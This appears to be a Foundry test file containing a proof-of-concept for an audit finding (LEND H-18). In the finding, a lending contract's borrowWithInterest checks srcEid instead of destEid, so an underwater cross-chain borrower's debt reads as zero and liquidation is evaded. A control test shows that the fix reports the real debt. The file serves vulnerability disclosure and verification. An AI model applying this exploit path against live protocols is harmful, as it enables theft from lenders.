// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import {
    Exploit,
    Token,
    LToken,
    LendStorage,
    LendStorageFixed,
    Liquidator
} from "./58387-h-18-incorrect-srceid-check-in-borrowwithinterest-sherlock.sol";

// LEND H-18: borrowWithInterest filters cross-chain borrows by `srcEid == currentEid`,
// but records store `destEid == currentEid` on the source chain — so real debt reads
// as 0, the account looks healthy, and an underwater borrower evades liquidation.
contract PoC_58387_LendSrcEidCheck is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant CHAIN_A = 1;
    uint256 internal constant CHAIN_B = 2;
    uint256 internal constant PRINCIPAL = 1_000e18;
    uint256 internal constant INDEX = 1e18;

    // Exploit path: liquidation reads 0 debt, so the borrower keeps the principal.
    function test_attacker_evadesLiquidation() public {
        Exploit exp = new Exploit();
        exp.run();

        LendStorage store = exp.store();
        Token token = exp.token();
        LToken lToken = exp.lToken();

        uint256 reportedDebt = store.borrowWithInterest(address(exp), address(lToken));
        uint256 kept = token.balanceOf(SINK);

        emit log_named_uint("real cross-chain debt (principal) ", PRINCIPAL);
        emit log_named_uint("borrowWithInterest reported debt  ", reportedDebt);
        emit log_named_uint("principal kept (evaded seizure)   ", kept);

        // The debt is reported as ZERO despite a real 1_000e18 cross-chain borrow.
        assertEq(reportedDebt, 0, "BUG not reproduced: debt should read 0");
        // Liquidation never fired, so the underwater borrower kept the full principal.
        assertEq(kept, PRINCIPAL, "attacker did not retain the principal");
    }

    // Control: the fixed filter (destEid == currentEid) reports the real debt, and a
    // liquidator wired to it seizes the principal — no evasion.
    function test_control_fixedReportsDebtAndLiquidates() public {
        Token token = new Token();
        LToken lToken = new LToken(INDEX);
        LendStorageFixed store = new LendStorageFixed();
        store.setCurrentEid(CHAIN_A);
        store.setLTokenToUnderlying(address(lToken), address(token));
        store.pushCrossChainBorrow(
            address(this),
            address(token),
            LendStorageFixed.Borrow({
                srcEid: CHAIN_B,
                destEid: CHAIN_A,
                principle: PRINCIPAL,
                borrowIndex: INDEX,
                borrowedlToken: address(lToken),
                srcToken: address(token)
            })
        );

        uint256 reportedDebt = store.borrowWithInterest(address(this), address(lToken));

        emit log_named_uint("fixed reported debt", reportedDebt);

        // The fixed filter correctly surfaces the 1_000e18 cross-chain debt.
        assertEq(reportedDebt, PRINCIPAL, "fixed must report the real debt");
    }
}
